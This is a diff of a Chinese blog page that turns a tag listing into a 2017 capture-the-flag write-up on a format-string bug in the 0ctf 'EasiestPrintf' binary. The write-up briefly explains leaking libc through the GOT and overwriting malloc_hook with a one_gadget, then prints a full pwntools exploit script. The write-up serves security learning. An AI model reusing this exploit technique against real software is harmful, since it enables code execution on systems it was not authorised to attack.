@@ -45,7 +45,7 @@
     
     <title>
         
-            标签: 文件格式漏洞 | 
+            格式化字符串漏洞利用实战之 0ctf-easyprintf | 
         
         穷则变，变则通，通则久
     </title>
@@ -57,7 +57,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="">
+    <meta name="keywords" content=",format string">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -239,15 +239,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://jinyu00.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: 文件格式漏洞 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="格式化字符串漏洞利用实战之 0ctf-easyprintf | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://jinyu00.github.io/img/girl.png" />
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="format string"> 
 
+    
+        <meta property="article:published_time" content="Sun Dec 17 2017 18:20:00 GMT+0800" />
+        <meta property="article:modified_time" content="Sun Dec 17 2017 18:28:40 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="标签: 文件格式漏洞 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="格式化字符串漏洞利用实战之 0ctf-easyprintf | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://jinyu00.github.io/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -255,13 +258,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://jinyu00.github.io/tags/文件格式漏洞/index.html" />
+        <link rel="canonical" href="http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html",
+    "headline": "格式化字符串漏洞利用实战之 0ctf-easyprintf",
+    "datePublished": "Sun Dec 17 2017 18:20:00 GMT+0800",
+    "dateModified": "Sun Dec 17 2017 18:28:40 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",format string",
+    "description": "",
+}
+</script>
 
 
     
@@ -304,98 +337,289 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/11/21/cve_2015_3864_google_exploit.html">CVE-2015-3864漏洞利用分析(exploit_from_google)</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言接下来要学习安...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/11/21/cve_2015_3864_google_exploit.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>11月 21, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/安卓安全/">安卓安全</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                格式化字符串漏洞利用实战之 0ctf-easyprintf
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>12月 17, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC40lEQVR42u3aQbIaMQwFQO5/6eQAKcx7Mj+Z2O0VVXgYtVmoJPn168r1wsbGxsbGxsbGxn4k+xWvP59693n97NuwlvuTt3yIGRsbG/todhLQ+rDWO9vPa8YwZmxsbOwL2Mlr8rSU7EzSZB7Phz8AGxsbGzsuA5IjSHbmhRA2NjY2dsvOC4DkF/KDw8bGxsbebyrlBcZ6/85R/oNeGjY2Nvbj2XmB8ZzPf3W+jY2Njf1gdruGZcBofNsOdz9Ejo2NjX0ou70u84WSYHQoO/uxsbGx72GvR7P7Q991syn5Nr/ig42NjX0Pe/3Y7PpOW6jk6S1JlnVTCRsbG/sgdt5Uml3NSYJrk+Vw0IuNjY19EHunld8eQR5uXmxszbexsbGxj2DvvDJ5dl3Y5A2sfDiBjY2NfSc7v3AzO4h86LuOp01p2NjY2Dew23Z/22xqr1Tmw4n84LCxsbHPZuftpGTUOgO3F3SGfww2Njb20ey89ZM3kvIRQlLq5Mji8iU2Njb2EexXvL4bSnK4ybAhP2hsbGzse9htI74dNuzvHBZC2NjY2Iey87JkdqFnp7D51jVQbGxs7BvY+QCgHRvk1zF3UmMUOTY2Nvah7DagNqy89Z+Mh9sxMDY2NvY97La5k7ymPb5ZeVOUOtjY2NgXsGeFwX5bf9ZCqlMmNjY29gXsPFHNGkMzQFuiFE0lbGxs7IPYP1FstOmnTYF5owobGxv7HnZeVOSHtV/25IVK3VTCxsbGvoa9k7qKQezG2ipFsLGxsf9zdrvy5FGMYANG/q63O7GxsbEPZbdJYqutMxoqrI8gjxkbGxv7bHbeoM8Hvd9qEuXJ8kOpg42NjX0Be1YS5FdnZolt1mCqe2nY2NjYl7GTkXC+sz3QfNiAjY2NjZ03dGYpLfn92cgZGxsb+052Elbb3G8DbY+7GF1gY2NjH83OmzX5a/KS41uj4h+cb2NjY2M/mH3PwsbGxsbGxsbGxn7M+g0VEAttOylhrAAAAABJRU5ErkJggg==">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/format-string/">format string</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=格式化字符串漏洞利用实战之 0ctf-easyprintf&url=http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=格式化字符串漏洞利用实战之 0ctf-easyprintf&url=http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是 <code>0ctf</code> 的一道比较简单的格式化串的题目。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>逻辑非常简单</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506132721kaldyhzb.png?imageslim" alt="paste image"></p>
+<p><code>do_read</code> 可以打印内存地址的数据，可用来 泄露 <code>got</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506205821m9i5ym56.png?imageslim" alt="paste image"></p>
+<p><code>leave</code> 格式化字符串漏洞。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506227980602voj1w.png?imageslim" alt="paste image"></p>
+<p><code>printf(s)</code> 直接调用 <code>exit</code> 退出了。不过可以使用 <code>%1000c</code> 触发 <code>printf</code> 里面的 <code>malloc</code> 和 <code>free</code>, 所以思路很清楚了，修改 <code>free_hook</code> 或者 <code>malloc_hook</code> 为 <code>one_gadget</code>, 并且在格式化串末尾加上 <code>%1000c</code>触发 <code>malloc</code> 和 <code>free</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506399803fdtgne0f.png?imageslim" alt="paste image"></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最开始修改 <code>free_hook</code>, 发现所有的 <code>one_gadget</code> 都不能用，后面使用了 <code>malloc_hook</code> ，终于找到一个可以用的，估计和寄存器的数据有关。</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;,log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./EasiestPrintf&quot;)</div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"></div><div class="line"># c</div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">setvbuf_got = 0x08049FF0 </div><div class="line">exit_got = 0x08049FE4</div><div class="line"></div><div class="line">pause()</div><div class="line">p.sendline(str(setvbuf_got))</div><div class="line">p.recvuntil(&quot;Which address you wanna read:\n&quot;)</div><div class="line">setvbuf_addr = int(p.recv(len(&apos;0xf7e60360&apos;)), 16)</div><div class="line">libc_addr = setvbuf_addr - 0x60360</div><div class="line">free_hook = libc_addr + 0x1b38b0</div><div class="line">malloc_hook = libc_addr + 0x1b2768</div><div class="line">one_gadget = libc_addr + 0x3ac69</div><div class="line">log.info(&quot;free_hook: &quot; + hex(free_hook))</div><div class="line">log.info(&quot;one_gadget: &quot; + hex(one_gadget))</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = fmtstr_payload(7, &#123;malloc_hook: one_gadget&#125;)  </div><div class="line">payload +=  &quot;%100000c&quot;</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html">http://jinyu00.github.io/2017/12/17/pwn_with_format_0ctf_easyprintf.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/12/17/pwn_with_format_decoder.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -597,6 +821,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
